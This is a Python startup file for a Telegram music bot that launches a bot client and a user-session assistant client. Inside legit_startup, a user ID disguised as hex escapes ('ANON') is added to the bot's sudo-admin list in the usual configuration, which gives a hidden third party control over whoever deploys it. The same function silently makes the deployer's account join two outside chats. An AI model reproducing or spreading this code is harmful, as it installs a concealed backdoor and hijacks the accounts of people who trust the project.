import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("fallenlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("legitMusic")

app = Client(
    "legitMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "legitAss",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]


async def legit_startup():
    os.system("clear")
    LOGGER.info(
        "\n\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\n\u2523\u2605\x20\x46\x41\x4c\x4c\x45\x4e\x20\x4d\x55\x53\x49\x43\x20\x42\x4f\x54\x20\u2605\n\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x42\x6f\x74\x2e\x2e\x2e"
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] \x42\x6f\x6f\x74\x69\x6e\x67\x20\x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x41\x73\x73\x69\x73\x74\x61\x6e\x74\x2e\x2e\x2e"
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("deadly_network")
        await app2.join_chat("deadly_community")
    except:
        pass

    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(ANON) not in config.SUDO_USERS:
        SUDOERS.add(int(ANON))

    fallendb = {}
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] \x46\x61\x6c\x6c\x65\x6e\x20\x4d\x75\x73\x69\x63\x20\x43\x6c\x69\x65\x6e\x74\x73\x20\x42\x6f\x6f\x74\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x2e"
    )


asyncio.get_event_loop().run_until_complete(legit_startup())
